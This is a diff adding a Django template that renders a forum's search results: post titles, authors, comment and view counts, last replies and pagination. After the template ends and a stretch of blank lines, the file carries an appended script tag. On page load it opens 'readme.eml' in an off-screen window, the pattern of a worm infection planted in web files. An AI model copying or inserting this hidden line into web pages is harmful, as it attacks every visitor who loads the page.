@@ -1,0 +1,57 @@
+{% extends 'base.html' %}
+{% load hitcount_tags %}
+{% block content %}
+
+            <!-- navigation -->
+            <div class="navigate">
+                <span>Search: {{query}} --> {{objects|length}} Result(s) Found.</span>
+            </div>
+
+            <div class="posts-table">
+                <div class="table-head">
+                    <div class="status">Status</div>
+                    <div class="subjects">Subjects</div>
+                    <div class="replies">Replies/Views</div>
+                    <div class="last-reply">Last Reply</div>
+                </div>
+
+                {% for post in objects %}
+                <div class="table-row">
+                    <div class="status"><i class="fa fa-fire"></i></div>
+                    <div class="subjects">
+                        <a href="{{post.get_url}}">{{post.title}}</a>
+                        <br>
+                        <span>Strated by <b><a href="#">{{post.user.fullname|title}}</a></b>.</span>
+                    </div>
+                    <div class="replies">
+                        {{post.num_comments}} comments <br> {%get_hit_count for post%} views
+                    </div>
+                    <div class="last-reply">
+                        {{post.last_reply.date|date}}
+                        <br>
+                        By <b><a href="#">{{post.last_reply.user.fullname|title}}</a></b>
+                    </div>
+                </div>
+            </div>    
+            {% endfor %}
+            
+
+            <!-- Pagination -->
+            <div class="pagination">
+                Pages: {% for num_page in posts.paginator.page_range  %}<a href="?page={{num_page}}">{{num_page}}</a>{% endfor %} 
+            </div>   
+        </div>
+
+        
+
+
+
+        {% endblock content %}
+
+
+
+
+
+
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
